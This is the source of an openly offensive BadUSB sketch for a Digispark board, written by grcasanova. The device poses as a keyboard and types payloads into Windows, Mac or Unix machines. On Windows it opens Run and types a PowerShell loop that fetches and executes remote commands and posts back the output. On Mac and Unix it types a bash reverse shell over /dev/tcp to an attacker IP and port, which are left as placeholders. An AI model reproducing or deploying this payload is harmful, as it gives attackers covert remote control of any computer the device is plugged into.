/*
 * BadUSB - HID Reverse TCP attack for Win, Mac and Unix OS - Last update 25/10/2018 - Copyright (c) by grcasanova
 *
 * change IP and PORT constants to match the attacking machine details
 *
*/

#include <avr/wdt.h>
#include <EEPROM.h>
#include "DigiKeyboard.h"

// define server IP and port
#define IP "0.0.0.0"
#define PORT "0"
#define WIN_FLAG 100
#define NIX_FLAG 200
#define MAC_FLAG 300

static int run;
unsigned int address = 0;
const byte interruptPin0 = 0;
const byte interruptPin1 = 1;
const byte interruptPin2 = 3;

void blinkLed();
bool win_os();

void setup()
{
  // using watchdogs, the HID emulation can be reset if it hangs
  wdt_enable(WDTO_4S);
  run = 0;

  // pin setup
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
  pinMode(interruptPin0, INPUT_PULLUP);
  pinMode(interruptPin1, INPUT_PULLUP);
  pinMode(interruptPin2, INPUT_PULLUP);
  
  // interrups setup
  attachInterrupt(digitalPinToInterrupt(interruptPin0), setWinFlag, CHANGE); // attach INT0 interrupt
  attachInterrupt(digitalPinToInterrupt(interruptPin1), setNixFlag, CHANGE); // attach INT1 interrupt
  attachInterrupt(digitalPinToInterrupt(interruptPin2), setMacFlag, CHANGE); // attach INT2 interrupt
}

// Win Os flag setup
void setWinFlag()
{
  EEPROM.write(address, WIN_FLAG);
}

// Unix Os flag setup
void setNixFlag()
{
  EEPROM.write(address, NIX_FLAG);
}

void setMacFlag()
{
  EEPROM.write(address, MAC_FLAG);
}

void loop()
{
  wdt_reset();

  byte value = EEPROM.read(address);

  if (value == WIN_FLAG)  // running on a Windows machine
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    wdt_reset();
    DigiKeyboard.println("PowerShell $u='"IP":"PORT"';while(1){irm $u -m post -b(iex(irm $u).c)}");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }
  else if (value == MAC_FLAG) // running on a Mac
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); //open spotlight
    DigiKeyboard.delay(500);
    DigiKeyboard.println("terminal");
    DigiKeyboard.delay(1000);
    wdt_reset();
    DigiKeyboard.println("/bin/bash -i >& /dev/tcp/"IP"/"PORT" 0>&1");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }
  else  // running on a Unix machine
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    wdt_reset();
    DigiKeyboard.println("/bin/bash -i >& /dev/tcp/"IP"/"PORT" 0>&1");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }

  DigiKeyboard.update();

  // after the second run (at the third run), the led starts blinking indefinitely
  if (run > 2)
    blinkLed();
  else
    run++;
}

void blinkLed()
{
  while (true) {
    wdt_reset();
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
